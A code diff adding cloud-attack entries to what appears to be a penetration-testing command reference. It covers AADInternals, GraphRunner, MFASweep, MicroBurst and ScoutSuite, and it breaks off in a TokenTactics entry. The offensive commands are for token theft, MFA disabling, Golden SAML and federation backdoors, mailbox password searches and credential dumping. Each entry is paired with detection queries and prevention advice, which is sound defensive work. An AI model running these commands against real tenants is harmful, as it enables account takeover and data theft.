@@ -101,6 +101,124 @@ const COMMAND_DATA = {
       "explain": "802.11 wireless attacks are link-layer threats detectable via monitor mode capture.\nDeauthentication attacks force clients off the network to capture WPA handshakes or cause DoS.\n=== PREREQUISITES: MONITOR MODE ===\n# List wireless interfaces\niwconfig\n\n# Enable monitor mode via airmon-ng (kills interfering processes)\nsudo airmon-ng start wlan0\n   Creates wlan0mon interface ..."
     },
     {
+      "id": "cloud-aadinternals",
+      "name": "AADInternals - Azure AD / M365 Attack Toolkit",
+      "command": "Import-Module AADInternals; Get-AADIntAccessTokenForAADGraph -Credentials <creds>",
+      "description": "AADInternals is a PowerShell module for administering, enumerating, and attacking Azure AD (Entra ID) and Microsoft 365. It covers reconnaissance against tenants, access-token acquisition for many resources, credential and MFA inspection, Pass-the-PRT, Golden SAML / immutableID abuse, DesktopSSO/Seamless-SSO abuse, and backdoor federation. The single most comprehensive offensive Entra ID toolkit.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "Gerenios/AADInternals",
+      "tags": [
+        "aadinternals",
+        "azure",
+        "entra-id",
+        "m365",
+        "golden-saml",
+        "pass-the-prt",
+        "token"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1606.002",
+        "T1552"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  Install-Module AADInternals -Scope CurrentUser\n  Import-Module AADInternals\n\n=== UNAUTHENTICATED RECON (just a domain) ===\n  Get-AADIntLoginInformation -Domain <domain>        # is the tenant managed or federated\n  Invoke-AADIntReconAsOutsider -DomainName <domain>  # tenant id, domains, MDI/DesktopSSO status\n  Get-AADIntTenantID -Domain <domain>\n\n=== GET ACCESS TOKENS (many resources) ===\n  $cred = Get-Credential\n  Get-AADIntAccessTokenForAADGraph -Credentials $cred -SaveToCache\n  Get-AADIntAccessTokenForMSGraph -SaveToCache\n  Get-AADIntAccessTokenForEXO -SaveToCache          # Exchange Online\n  Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache\n  # also supports device-code, PRT, BPRT, and refresh-token flows\n\n=== AUTHENTICATED RECON ===\n  Invoke-AADIntReconAsInsider        # roles, users, devices, sync config\n  Get-AADIntGlobalAdmins\n  Get-AADIntSyncConfiguration        # AAD Connect / sync account details\n\n=== CREDENTIAL + MFA ABUSE ===\n  Get-AADIntUsersPasswordPolicy\n  Set-AADIntUserMFA -UserPrincipalName <user> -State Disabled   # if privileged\n\n=== GOLDEN SAML / IMMUTABLEID (needs token-signing cert) ===\n  # export ADFS token-signing cert with Export-AADIntADFSSigningCertificate on the ADFS box,\n  # then forge: New-AADIntSAMLToken / Open-AADIntOffice365Portal\n  ConvertTo-AADIntBackdoor -Domain <domain>          # federation backdoor (AnyPurpose)\n\n=== PASS-THE-PRT ===\n  # from a joined host: Get-AADIntUserPRTToken  then  Get-AADIntAccessTokenForAADGraph -PRTToken ...\n\n=== ALTERNATIVES ===\n  ROADtools/roadrecon   # offline Entra enumeration\n  AzureHound            # BloodHound graph\n  TokenTactics          # token manipulation only\n  GraphRunner           # post-compromise Graph toolkit",
+      "examples": [
+        {
+          "label": "Outsider recon of a tenant",
+          "command": "Invoke-AADIntReconAsOutsider -DomainName <domain>"
+        },
+        {
+          "label": "Get MSGraph token and cache",
+          "command": "Get-AADIntAccessTokenForMSGraph -Credentials $cred -SaveToCache"
+        },
+        {
+          "label": "Insider recon after auth",
+          "command": "Invoke-AADIntReconAsInsider"
+        }
+      ],
+      "references": [
+        {
+          "title": "AADInternals",
+          "url": "https://github.com/Gerenios/AADInternals"
+        },
+        {
+          "title": "AADInternals docs",
+          "url": "https://aadinternals.com/aadinternals/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-roadrecon",
+          "note": "ROADrecon for offline Entra graph enumeration.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-azurehound",
+          "note": "AzureHound for BloodHound attack-path graphing.",
+          "rel": "alternative"
+        },
+        {
+          "id": "azure-entra-enum",
+          "note": "Entra enumeration follows token acquisition.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AADInternals uses documented Azure AD / M365 APIs and public token endpoints. Many recon calls are unauthenticated (tenant metadata is public), and token acquisition uses legitimate OAuth ROPC/device-code flows, so activity resembles normal client sign-ins unless federation/sync internals are touched.",
+        "prerequisites": "Unauthenticated: only a domain name. Authenticated actions: valid credentials or a token/PRT. Golden SAML: the ADFS token-signing certificate. Federation backdoor: Global Admin or sync-account rights.",
+        "impact": "Full tenant reconnaissance, token theft across resources, MFA tampering, persistent federation backdoors, and forged SAML tokens granting access as any user.",
+        "detection": "[MITRE T1078.004] Entra sign-in logs showing ROPC (password) or device-code grants from unusual clients/IPs; AADInternals default client IDs (e.g. 1b730954-... AAD Graph PowerShell); federation/domain changes (Set-DomainAuthentication) in the audit log; new or modified token-signing certs on ADFS.",
+        "artifacts": "Entra sign-in logs (clientAppUsed, appDisplayName), Entra audit logs for 'Set domain authentication' / 'Set federation settings', ADFS event 307/510 on cert changes, unusual MSGraph/EXO token issuance.",
+        "splunk_spl": "index=azure sourcetype=azure:aad:signin (authenticationProtocol=ropc OR authenticationProtocol=deviceCode)\n| stats count by userPrincipalName, appDisplayName, ipAddress\n| where count > 0",
+        "elastic_kql": "azure.signinlogs.properties.authentication_protocol:(ropc or deviceCode) or azure.auditlogs.operation_name:\"Set domain authentication\"",
+        "sentinel_kql": "SigninLogs\n| where AuthenticationProtocol in (\"ropc\",\"deviceCode\")\n| summarize Count=count() by UserPrincipalName, AppDisplayName, IPAddress\n| union (AuditLogs | where OperationName has \"domain authentication\" or OperationName has \"federation\")",
+        "sigma_rules": "azure_aadinternals_ropc_devicecode_signin",
+        "prevention": "Block ROPC and restrict device-code flow via Conditional Access; require MFA and compliant devices; protect ADFS token-signing certs (HSM, limited access); alert on any federation/domain-authentication change; move off ADFS to cloud auth where possible; monitor sync-account usage.",
+        "sources": [
+          "Gerenios/AADInternals",
+          "https://aadinternals.com/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Entra ROPC/device-code sign-in from AADInternals-style client",
+            "logic": "SigninLogs\n| where AuthenticationProtocol in (\"ropc\",\"deviceCode\") or AppId in (\"1b730954-1685-4b74-9bfd-dac224a7b894\",\"1950a258-227b-4e31-a9cf-717495945fc2\")\n| summarize Count=count(), IPs=make_set(IPAddress) by UserPrincipalName, AppDisplayName, bin(TimeGenerated, 1h)",
+            "data_source": "entra-id",
+            "attack": [
+              "T1078.004",
+              "T1552"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legacy scripts using ROPC; admin PowerShell tooling",
+            "tuning": "Allowlist known automation identities and source IPs; alert on new UPN+client pairs"
+          },
+          {
+            "platform": "sentinel",
+            "name": "Entra federation/domain authentication change (Golden SAML backdoor)",
+            "logic": "AuditLogs\n| where OperationName has \"domain authentication\" or OperationName has \"federation settings\"\n| project TimeGenerated, InitiatedBy, OperationName, TargetResources",
+            "data_source": "entra-id",
+            "attack": [
+              "T1606.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Planned federation migrations",
+            "tuning": "Alert on any change outside a change window; require ticket correlation"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-m06-gpo-permissions",
       "name": "Abusing GPO Permissions - Attack, Detection & Honeypot",
       "command": "Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -ne '<domain_controllers_sid>' }",
@@ -58260,6 +58378,111 @@ const COMMAND_DATA = {
       "explain": "Inject an XSS payload through a GraphQL argument that a downstream page or client reflects unescaped - the injection is stored/echoed via the GraphQL response and rendered by the front-end.:\n  { user(username: \"<script>alert(1)</script>\") { username } }\nGraphQL itself returns JSON (not directly rendered), so XSS fires when the front-end takes a returned field and injects it into the DOM, or when the argument is reflected into a server-rendered page elsewhere."
     },
     {
+      "id": "cloud-graphrunner",
+      "name": "GraphRunner - M365 Graph Post-Exploitation",
+      "command": "Import-Module GraphRunner.ps1; Get-GraphTokens",
+      "description": "GraphRunner is a post-compromise toolset for Microsoft Graph. With a user token it enumerates the tenant, searches mail/SharePoint/OneDrive/Teams for secrets, abuses app registrations and consent, deploys persistence (malicious app, mailbox rules, OneDrive pillage), and runs an interactive GUI. Built for operating as a compromised user through Graph alone.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "dafthack/GraphRunner",
+      "tags": [
+        "graphrunner",
+        "azure",
+        "m365",
+        "msgraph",
+        "post-exploitation",
+        "consent",
+        "persistence"
+      ],
+      "mitre": [
+        "T1114",
+        "T1098.003",
+        "T1534"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== LOAD ===\n  . .\\GraphRunner.ps1\n\n=== GET / REFRESH TOKENS ===\n  Get-GraphTokens                 # device-code flow -> $tokens\n  Invoke-RefreshGraphTokens       # keep tokens alive\n\n=== RECON ===\n  Invoke-GraphRecon -Tokens $tokens        # org, roles, CA policies, app info\n  Get-AzureADUsers -Tokens $tokens -OutFile users.txt\n  Get-SecurityGroups -Tokens $tokens\n  Get-UpdatableGroups -Tokens $tokens       # self-add to groups\n\n=== LOOT (search everything) ===\n  Invoke-SearchMailbox   -Tokens $tokens -SearchTerm \"password\" -MessageCount 50\n  Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm \"passw\"\n  Invoke-SearchTeams     -Tokens $tokens -SearchTerm \"secret\"\n\n=== PERSISTENCE / ABUSE ===\n  Invoke-InjectOAuthApp  -Tokens $tokens -AppName \"Perf\" -ReplyUrl ...   # consent-grant backdoor\n  Invoke-AddGroupMember  -Tokens $tokens -GroupId <id> -UserId <id>\n  New-MailboxRule via Graph (hide/forward)\n\n=== GUI ===\n  Invoke-GraphRunnerGUI\n\n=== ALTERNATIVES ===\n  TokenTactics    # token minting\n  AADInternals    # broader Entra/ADFS attacks\n  ROADrecon       # offline enumeration",
+      "examples": [
+        {
+          "label": "Get Graph tokens (device code)",
+          "command": "Get-GraphTokens"
+        },
+        {
+          "label": "Search mailbox for passwords",
+          "command": "Invoke-SearchMailbox -Tokens $tokens -SearchTerm password -MessageCount 50"
+        },
+        {
+          "label": "Recon the tenant",
+          "command": "Invoke-GraphRecon -Tokens $tokens"
+        }
+      ],
+      "references": [
+        {
+          "title": "GraphRunner",
+          "url": "https://github.com/dafthack/GraphRunner"
+        },
+        {
+          "title": "MITRE T1114 - Email Collection",
+          "url": "https://attack.mitre.org/techniques/T1114/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-tokentactics",
+          "note": "TokenTactics to mint/refresh the tokens GraphRunner uses.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cloud-aadinternals",
+          "note": "AADInternals for deeper Entra/ADFS attacks.",
+          "rel": "alternative"
+        },
+        {
+          "id": "azure-app-credential-abuse",
+          "note": "App/consent abuse overlaps with OAuth app injection.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Microsoft Graph exposes mail, files, Teams, groups, and app management behind one token scope set. A compromised user token lets an attacker read and act across all of M365 using sanctioned API calls that blend with normal client traffic.",
+        "prerequisites": "A valid Graph access/refresh token for a user (device-code phish or token theft). Some actions need specific delegated scopes or admin/consent rights.",
+        "impact": "Mass secret discovery across mailboxes/SharePoint/Teams, self-escalation into groups, OAuth-app consent backdoors, and mailbox-rule persistence.",
+        "detection": "[MITRE T1114/T1098.003] Graph search API bursts across many mailboxes/sites; new OAuth app registrations with consent grants; new inbox rules; group membership self-additions; device-code sign-ins.",
+        "artifacts": "Entra audit logs (Add app, Consent to application, Add member to group), Exchange audit (New-InboxRule, mailbox searches), MSGraph activity logs, unified audit log SearchQueryInitiatedExchange.",
+        "splunk_spl": "index=o365 (Operation=\"Add service principal.\" OR Operation=\"Consent to application.\" OR Operation=\"New-InboxRule\" OR Operation=\"Add member to group.\")\n| stats count by UserId, Operation, ClientIP",
+        "elastic_kql": "o365.audit.Operation:(\"Consent to application.\" or \"New-InboxRule\" or \"Add member to group.\")",
+        "sentinel_kql": "OfficeActivity\n| where Operation in (\"Add service principal.\",\"Consent to application.\",\"New-InboxRule\",\"Add member to group.\")\n| project TimeGenerated, UserId, Operation, ClientIP, Parameters",
+        "sigma_rules": "o365_graphrunner_consent_and_rule_persistence",
+        "prevention": "Restrict user consent to verified publishers only; admin-consent workflow; disable device-code where unused; alert on new inbox-forwarding rules and app consents; least-privilege Graph scopes; Conditional Access on Graph-using apps.",
+        "sources": [
+          "dafthack/GraphRunner",
+          "https://attack.mitre.org/techniques/T1114/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "OAuth app consent + persistence burst (GraphRunner)",
+            "logic": "OfficeActivity\n| where Operation in (\"Add service principal.\",\"Consent to application.\",\"New-InboxRule\",\"Add member to group.\")\n| summarize Ops=make_set(Operation), Count=count() by UserId, ClientIP, bin(TimeGenerated, 1h)\n| where Count > 2",
+            "data_source": "o365",
+            "attack": [
+              "T1098.003",
+              "T1114"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Admins onboarding apps; mail-rule power users",
+            "tuning": "Exclude admin accounts in change windows; focus on non-admin UPNs"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-group3r",
       "name": "Group3r - GPO Misconfiguration Analysis",
       "command": "group3r.exe -f <output_log>",
@@ -93881,6 +94104,210 @@ const COMMAND_DATA = {
       },
       "type": "command",
       "explain": "Impersonates the access token of another process, taking on that process owner's identity and privileges.:\n  steal_token <pid>\n`steal_token <pid>` impersonates the token of another logged-in user's process - move to a domain admin's token if one is running on the box."
+    },
+    {
+      "id": "cloud-mfasweep",
+      "name": "MFASweep - Find M365 Logins Without MFA",
+      "command": "Import-Module MFASweep.ps1; Invoke-MFASweep -Username <user> -Password <password>",
+      "description": "MFASweep logs a single set of M365 credentials into many Microsoft services (Graph, Azure portal, Exchange Web Services, ActiveSync, SharePoint, ADFS, etc.) to find any entry point where MFA is not enforced. Gaps in MFA coverage (common with legacy protocols) give an attacker a password-only foothold.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "dafthack/MFASweep",
+      "tags": [
+        "mfasweep",
+        "azure",
+        "m365",
+        "mfa",
+        "conditional-access",
+        "legacy-auth"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1556.006"
+      ],
+      "exam": "restricted",
+      "notes": "=== LOAD ===\n  . .\\MFASweep.ps1\n\n=== RUN ===\n  Invoke-MFASweep -Username <user>@<domain> -Password <password>\n  # tests: Microsoft Graph API, Azure Service Management API, Microsoft 365\n  #        web portal, EWS, ActiveSync, Azure portal, and (optionally) ADFS\n\n=== WITH ADFS CHECK ===\n  Invoke-MFASweep -Username <user>@<domain> -Password <password> -IncludeADFS\n\n=== INTERPRETATION ===\n  # 'MFA appears to be ENABLED' vs 'single factor' per endpoint.\n  # A single-factor endpoint (often EWS/ActiveSync/legacy) = password-only access.\n\n=== WARNING ===\n  # Each test is a real login attempt -> account lockout risk + many sign-in log entries.\n  # Use ONE account, known-good password; do not spray.\n\n=== ALTERNATIVES ===\n  o365spray        # user-enum + spray with MFA observations\n  AADInternals     # per-endpoint token tests\n  Conditional Access review (defensive)",
+      "examples": [
+        {
+          "label": "Sweep all default endpoints",
+          "command": "Invoke-MFASweep -Username <user>@<domain> -Password <password>"
+        },
+        {
+          "label": "Include ADFS endpoint",
+          "command": "Invoke-MFASweep -Username <user>@<domain> -Password <password> -IncludeADFS"
+        }
+      ],
+      "references": [
+        {
+          "title": "MFASweep",
+          "url": "https://github.com/dafthack/MFASweep"
+        },
+        {
+          "title": "MITRE T1556.006 - Modify Authentication Process: MFA",
+          "url": "https://attack.mitre.org/techniques/T1556/006/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "o365spray",
+          "note": "o365spray to obtain the valid credential first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cloud-tokentactics",
+          "note": "TokenTactics to pivot once a single-factor endpoint is found.",
+          "rel": "next"
+        },
+        {
+          "id": "cloud-aadinternals",
+          "note": "AADInternals for broader post-auth attacks.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "MFA in M365 is enforced per-application via Conditional Access, not globally. Legacy authentication protocols (EWS, ActiveSync, older SMTP/IMAP) and some first-party apps may be exempt, so one password can bypass MFA through an unprotected channel.",
+        "prerequisites": "A single valid username and password (no MFA token).",
+        "impact": "Discovery of a password-only access path into M365, defeating the organization's MFA investment for that channel.",
+        "detection": "[MITRE T1078.004] Entra sign-in logs showing the SAME user authenticating to many distinct applications/clientApps within seconds from one IP; legacy-auth sign-ins (clientAppUsed in Exchange ActiveSync, IMAP, POP, Other clients).",
+        "artifacts": "Entra sign-in logs (clientAppUsed, appDisplayName), legacy-auth sign-in category, rapid multi-app sign-in burst from one IP.",
+        "splunk_spl": "index=azure sourcetype=azure:aad:signin\n| stats dc(appDisplayName) as apps values(clientAppUsed) as clients by userPrincipalName, ipAddress, bin(_time,5m)\n| where apps > 4",
+        "elastic_kql": "azure.signinlogs.properties.client_app_used:(\"Exchange ActiveSync\" or \"IMAP4\" or \"POP3\" or \"Other clients\")",
+        "sentinel_kql": "SigninLogs\n| summarize Apps=dcount(AppDisplayName), Clients=make_set(ClientAppUsed) by UserPrincipalName, IPAddress, bin(TimeGenerated, 5m)\n| where Apps > 4",
+        "sigma_rules": "azure_mfasweep_multi_app_signin_burst",
+        "prevention": "Block legacy authentication tenant-wide (Conditional Access / Security Defaults); require MFA for ALL apps and clients; enable sign-in risk policies; disable unused protocols (EWS, ActiveSync, IMAP/POP) per mailbox.",
+        "sources": [
+          "dafthack/MFASweep",
+          "https://attack.mitre.org/techniques/T1556/006/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "One user authenticating to many M365 apps in minutes (MFASweep)",
+            "logic": "SigninLogs\n| summarize Apps=dcount(AppDisplayName), Clients=make_set(ClientAppUsed), Results=make_set(ResultType) by UserPrincipalName, IPAddress, bin(TimeGenerated, 5m)\n| where Apps > 4",
+            "data_source": "entra-id",
+            "attack": [
+              "T1078.004",
+              "T1556.006"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Automated health probes; onboarding scripts",
+            "tuning": "Exclude service accounts; emphasize legacy clientAppUsed values"
+          }
+        ]
+      }
+    },
+    {
+      "id": "cloud-microburst",
+      "name": "MicroBurst - Azure Recon and Attack (PowerShell)",
+      "command": "Import-Module MicroBurst.psm1; Invoke-EnumerateAzureBlobs -Base <keyword>",
+      "description": "MicroBurst is a PowerShell toolkit for Azure assessment and attack: anonymous blob/storage enumeration, subdomain/service discovery, dumping credentials from Automation Accounts / Key Vaults / App Services, RunCommand on VMs, and token/credential harvesting. Covers both unauthenticated recon and authenticated post-exploitation across Azure services.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "NetSPI/MicroBurst",
+      "tags": [
+        "microburst",
+        "azure",
+        "storage",
+        "key-vault",
+        "automation-account",
+        "runcommand",
+        "recon"
+      ],
+      "mitre": [
+        "T1526",
+        "T1552.005",
+        "T1580"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== LOAD ===\n  Import-Module .\\MicroBurst.psm1\n\n=== UNAUTHENTICATED RECON ===\n  Invoke-EnumerateAzureBlobs -Base <keyword>        # guess public storage blobs\n  Invoke-EnumerateAzureSubDomains -Base <keyword>   # *.azurewebsites.net etc.\n\n=== AUTHENTICATED (Connect-AzAccount first) ===\n  Get-AzPasswords                 # dump creds: Key Vault, Automation, App Service, ACR\n  Get-AzDomainInfo                # tenant/subscription inventory -> files\n  Invoke-AzVMBulkCMD   -Command \"whoami\"            # RunCommand on all VMs you can\n  Get-AzStorageKeys\n\n=== REST / TOKEN HELPERS ===\n  Get-AzureADToken / REST modules under Az/ and REST/\n\n=== OUTPUT ===\n  # Get-AzDomainInfo writes CSV/JSON inventory; Get-AzPasswords prints a creds table\n\n=== ALTERNATIVES ===\n  AADInternals   # Entra/M365 identity attacks\n  ScoutSuite     # config audit\n  roadrecon      # offline Entra graph\n  PowerZure      # (archived) similar Az attack set",
+      "examples": [
+        {
+          "label": "Enumerate public blobs by keyword",
+          "command": "Invoke-EnumerateAzureBlobs -Base contoso"
+        },
+        {
+          "label": "Dump Azure credentials",
+          "command": "Get-AzPasswords"
+        },
+        {
+          "label": "RunCommand on all reachable VMs",
+          "command": "Invoke-AzVMBulkCMD -Command whoami"
+        }
+      ],
+      "references": [
+        {
+          "title": "MicroBurst",
+          "url": "https://github.com/NetSPI/MicroBurst"
+        },
+        {
+          "title": "MITRE T1552.005 - Cloud Instance Metadata/Secrets",
+          "url": "https://attack.mitre.org/techniques/T1552/005/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-aadinternals",
+          "note": "AADInternals for the identity-plane attacks.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-scoutsuite",
+          "note": "ScoutSuite for a full config audit view.",
+          "rel": "alternative"
+        },
+        {
+          "id": "azure-managed-identity-token",
+          "note": "Managed-identity token abuse pairs with VM RunCommand.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "MicroBurst mixes anonymous storage/subdomain probing (public endpoints) with authenticated Az API calls. Credential extraction (Get-AzPasswords) and VM RunCommand use legitimate management operations granted to Contributor-level identities, so the risk is over-privileged roles rather than an exploit.",
+        "prerequisites": "Unauthenticated recon: nothing but a keyword. Credential dumping / RunCommand: an authenticated principal with Contributor or specific resource rights.",
+        "impact": "Discovery of public storage, extraction of secrets from Key Vaults/Automation/App Services, and arbitrary command execution on Azure VMs.",
+        "detection": "[MITRE T1552.005/T1580] Azure Activity logs for Key Vault secret reads, Automation credential access, Microsoft.Compute/virtualMachines/runCommand/action, and listKeys on storage; bursts of anonymous 404/200 against *.blob.core.windows.net.",
+        "artifacts": "Azure Activity log (runCommand, listKeys, Vault Get Secret), Key Vault diagnostic logs (SecretGet), storage analytics logs, Automation job logs.",
+        "splunk_spl": "index=azure sourcetype=azure:activity (operationName.value=\"Microsoft.Compute/virtualMachines/runCommand/action\" OR operationName.value=\"Microsoft.KeyVault/vaults/secrets/read\" OR operationName.value=\"*listKeys/action\")\n| stats count by caller, operationName.value, resourceId",
+        "elastic_kql": "azure.activitylogs.operation_name:(*runCommand* or *listKeys* or *secrets/read*)",
+        "sentinel_kql": "AzureActivity\n| where OperationNameValue has \"runCommand\" or OperationNameValue has \"listKeys\" or OperationNameValue has \"secrets/read\"\n| summarize Count=count() by Caller, OperationNameValue, bin(TimeGenerated, 10m)\n| where Count > 1",
+        "sigma_rules": "azure_microburst_cred_dump_runcommand",
+        "prevention": "Least-privilege (avoid broad Contributor); private endpoints and no anonymous blob access; Key Vault RBAC + firewall + purge protection; restrict and log runCommand; Defender for Cloud alerts on secret access and VM command execution.",
+        "sources": [
+          "NetSPI/MicroBurst",
+          "https://attack.mitre.org/techniques/T1552/005/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Azure credential dump + VM RunCommand (MicroBurst)",
+            "logic": "AzureActivity\n| where OperationNameValue has \"runCommand\" or OperationNameValue has \"listKeys\" or OperationNameValue has \"secrets\"\n| summarize Ops=make_set(OperationNameValue), Count=count() by Caller, bin(TimeGenerated, 15m)\n| where Count > 2",
+            "data_source": "azure-activity",
+            "attack": [
+              "T1552.005",
+              "T1580"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Automation runbooks, deployment pipelines",
+            "tuning": "Allowlist deployment principals; alert on interactive users doing this"
+          }
+        ]
+      }
     },
     {
       "id": "ad-mimikatz-dcsync",
@@ -138828,6 +139255,111 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "cloud-scoutsuite",
+      "name": "ScoutSuite - Multi-Cloud Security Audit",
+      "command": "scout aws --profile <profile>",
+      "description": "ScoutSuite is a multi-cloud (AWS, Azure, GCP, Alibaba, Oracle) security-auditing tool. Using read-only API access it collects configuration and produces an offline HTML report of misconfigurations and risks (public storage, permissive security groups, weak IAM, logging gaps). Used offensively to map weaknesses and defensively as a CSPM baseline.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "Cloud Auditing",
+      "certifications": [
+        "MCRTA",
+        "CPTS"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "nccgroup/ScoutSuite",
+      "tags": [
+        "scoutsuite",
+        "aws",
+        "azure",
+        "gcp",
+        "cspm",
+        "audit",
+        "misconfiguration"
+      ],
+      "mitre": [
+        "T1526",
+        "T1580"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip install scoutsuite    # or: pipx install scoutsuite\n\n=== AWS ===\n  scout aws --profile <profile>\n  scout aws --profile <profile> --services s3 iam ec2    # scope services\n\n=== AZURE ===\n  scout azure --cli                 # use az login session\n  scout azure --user-account        # interactive\n  scout azure --service-principal --tenant <id> --client-id <id> --client-secret <secret>\n\n=== GCP ===\n  scout gcp --user-account\n  scout gcp --service-account <keyfile.json>\n\n=== OUTPUT ===\n  # writes scoutsuite-report/ with an HTML dashboard; open scoutsuite-report/index.html\n  # findings ranked by severity; filter to 'danger' items first\n\n=== ALTERNATIVES ===\n  Prowler       # AWS/Azure/GCP CLI checks (CIS)\n  CloudFox      # offensive attack-path enumeration (AWS)\n  Pacu          # AWS exploitation\n  microburst    # Azure-focused recon/attack",
+      "examples": [
+        {
+          "label": "Audit an AWS profile",
+          "command": "scout aws --profile target"
+        },
+        {
+          "label": "Audit Azure via CLI session",
+          "command": "scout azure --cli"
+        },
+        {
+          "label": "Audit GCP with a service account",
+          "command": "scout gcp --service-account key.json"
+        }
+      ],
+      "references": [
+        {
+          "title": "ScoutSuite",
+          "url": "https://github.com/nccgroup/ScoutSuite"
+        },
+        {
+          "title": "MITRE T1526 - Cloud Service Discovery",
+          "url": "https://attack.mitre.org/techniques/T1526/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-prowler-audit",
+          "note": "Prowler for CIS-benchmark CLI checks.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-cloudfox",
+          "note": "CloudFox for offensive attack-path mapping in AWS.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "enumerate-iam for quick permission discovery.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ScoutSuite calls read-only Describe/List/Get APIs permitted by the supplied credentials. This is normal control-plane activity, so bulk configuration collection blends in unless API volume and breadth are baselined.",
+        "prerequisites": "Valid read-only cloud credentials (IAM user/role, Azure account/SP, GCP SA).",
+        "impact": "Complete offline map of cloud misconfigurations (public buckets, open security groups, weak IAM, logging gaps) that an attacker can target next.",
+        "detection": "[MITRE T1526/T1580] CloudTrail/Azure-Activity/GCP-audit burst of Describe*/List*/Get* across many services and regions from one identity in minutes; ScoutSuite user-agent strings.",
+        "artifacts": "CloudTrail enumeration spikes; Azure Activity read bursts; GCP admin-read audit logs; Python/botocore user-agent patterns.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=Describe* OR eventName=List* OR eventName=Get*)\n| stats dc(eventSource) as services count by userIdentity.arn, bin(_time,10m)\n| where services > 10 AND count > 200",
+        "elastic_kql": "aws.cloudtrail.event_name:(Describe* or List* or Get*) or azure.activitylogs.operation_name:*read*",
+        "sentinel_kql": "AzureActivity\n| where OperationNameValue endswith \"read\" or OperationNameValue has \"list\"\n| summarize Ops=count(), Services=dcount(ResourceProviderValue) by Caller, bin(TimeGenerated, 10m)\n| where Services > 10 and Ops > 200",
+        "sigma_rules": "cloud_scoutsuite_multiservice_enumeration",
+        "prevention": "Least-privilege and time-bound audit roles; alert on cross-service enumeration bursts; GuardDuty/Defender for Cloud recon findings; restrict who can run read-all audits; rotate audit credentials.",
+        "sources": [
+          "nccgroup/ScoutSuite",
+          "https://attack.mitre.org/techniques/T1526/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Multi-service cloud enumeration burst (ScoutSuite/Prowler)",
+            "logic": "index=aws sourcetype=aws:cloudtrail (eventName=Describe* OR eventName=List* OR eventName=Get*)\n| bin _time span=10m\n| stats dc(eventSource) as services count by _time, userIdentity.arn\n| where services > 10 AND count > 200",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1526",
+              "T1580"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "CSPM/inventory automation, backup scanners",
+            "tuning": "Allowlist known audit roles; baseline per-identity service breadth"
+          }
+        ]
+      }
+    },
+    {
       "type": "reference",
       "platform": "linux",
       "requires": [
@@ -166869,6 +167401,111 @@ const COMMAND_DATA = {
       "explain": "Persistent, splittable terminal sessions - essential for keeping listeners and scans alive and organizing engagement panes.\nPrefix is CTRL+B.\n[CTRL+B] c   new window\n[CTRL+B] 0/1 switch to window 0/1\n[CTRL+B] SHIFT+%  split vertical pane\n[CTRL+B] SHIFT+\"  split horizontal pane\n[CTRL+B] arrows   move between panes"
     },
     {
+      "id": "cloud-tokentactics",
+      "name": "TokenTactics - Azure Token Manipulation",
